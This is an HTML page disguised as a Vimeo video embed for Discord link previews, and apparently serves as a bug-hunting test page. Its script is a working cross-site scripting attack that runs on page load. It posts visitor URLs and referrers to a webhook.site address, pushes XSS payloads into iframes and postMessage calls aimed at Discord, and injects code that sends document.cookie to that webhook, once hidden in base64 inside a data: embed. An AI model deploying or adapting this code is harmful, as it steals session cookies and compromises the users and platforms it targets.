<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta property="og:site_name" content="Vimeo">
    <meta property="og:url" content="https://bug-hunting.vercel.app/discord/vimeo_embed/discord_bug.html">
    <meta property="og:type" content="website">
    <meta property="og:title" content="Please Die">
    <meta property="og:description" content="H4CK1NG 1S L1F3">
    <meta property="og:image" content="https://img.anili.st/user/5600322">
    <meta property="og:image:type" content="image/jpeg">
    <meta property="og:image:width" content="1200">
    <meta property="og:image:height" content="630">
    <meta property="twitter:card" content="summary_large_image">
    <meta property="twitter:image" content="https://img.anili.st/user/5600322">
    <meta name="theme-color" content="#FF0000">
    <title>Bug Test</title>
    <script src="https://player.vimeo.com/api/player.js"></script>
    <script>
        function logToWebhook(data) {
            const img = new Image();
            img.src = "https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?data=" + encodeURIComponent(JSON.stringify(data));
        }

        async function attemptExploit() {
            try {
                logToWebhook({
                    type: 'page_load',
                    url: window.location.href,
                    referrer: document.referrer,
                    timestamp: new Date().toISOString()
                });

                const frame = document.createElement('iframe');
                frame.src = "https://player.vimeo.com/video/403530213#\">&lt;img src=x onerror=alert(document.cookie)&gt;";
                frame.width = '640';
                frame.height = '360';
                frame.allow = 'autoplay; fullscreen';
                frame.setAttribute('onload', 'alert(1)');
                document.getElementById('vimeo-player').appendChild(frame);

                frame.onload = function() {
                    logToWebhook({
                        type: 'frame_loaded',
                        timestamp: new Date().toISOString()
                    });

                    window.parent.postMessage({
                        type: 'DISCORD_EMBED_LOADED',
                        data: {
                            url: 'javascript:alert(document.domain)',
                            width: '"><img src=x onerror=alert(1)>',
                            height: '"><svg onload=alert(1)>'
                        }
                    }, '*');
                };

            } catch(e) {
                logToWebhook({
                    type: 'error',
                    error: e.toString(),
                    stack: e.stack,
                    timestamp: new Date().toISOString()
                });
                console.error('Error:', e);
            }
        }

        window.onmessage = function(e) {
            logToWebhook({
                type: 'message_received',
                origin: e.origin,
                data: e.data,
                timestamp: new Date().toISOString()
            });

            if (e.origin.includes('discord.com')) {
                e.source.postMessage({
                    type: 'DISCORD_EMBED_UPDATE',
                    data: {
                        html: '<img src="https://img.anili.st/user/5600322" onerror="alert(document.domain)"><iframe src="javascript:alert(document.cookie)"></iframe><svg onload="fetch(\'https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?c=\'+document.cookie)"></svg><script>alert(1)<\/script>'
                    }
                }, '*');
            }
        };

        const observer = new MutationObserver(function(mutations) {
            mutations.forEach(function(mutation) {
                Array.from(mutation.addedNodes).forEach(function(node) {
                    if (node.tagName === 'IFRAME') {
                        node.contentWindow && node.contentWindow.postMessage({
                            type: 'XSS_PAYLOAD',
                            html: '<img src="x" onerror="(function(){try{alert(document.domain)}catch(e){}})()">',
                            script: 'try{alert(document.cookie)}catch(e){}'
                        }, '*');
                    }
                });
            });
        });

        document.addEventListener('DOMContentLoaded', function() {
            observer.observe(document.body, {
                childList: true,
                subtree: true
            });
        });

        try {
            if (window.top !== window.self) {
                window.top.location = window.self.location;
            }
        } catch(e) {}

        window.onload = function() {
            attemptExploit();
            
            setTimeout(function() {
                const div = document.createElement('div');
                div.innerHTML = 
                    '<img src="https://img.anili.st/user/5600322" onerror="alert(document.domain)">' +
                    '<object data="data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+"></object>' +
                    '<embed src="data:text/html;base64,PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly93ZWJob29rLnNpdGUvYmJlYjA3ZWEtMzBlOS00NTIyLTgwMmYtN2U2YWQxY2NiMTI0P2M9Jytkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+"></embed>' +
                    '<svg><script>alert(1)<\/script></svg>' +
                    '<img src="x" onerror="location=\'javascript:alert(1)\'">';
                document.body.appendChild(div);
            }, 1000);
        };
    </script>
</head>
<body>
    <div id="vimeo-player"></div>
</body>
</html>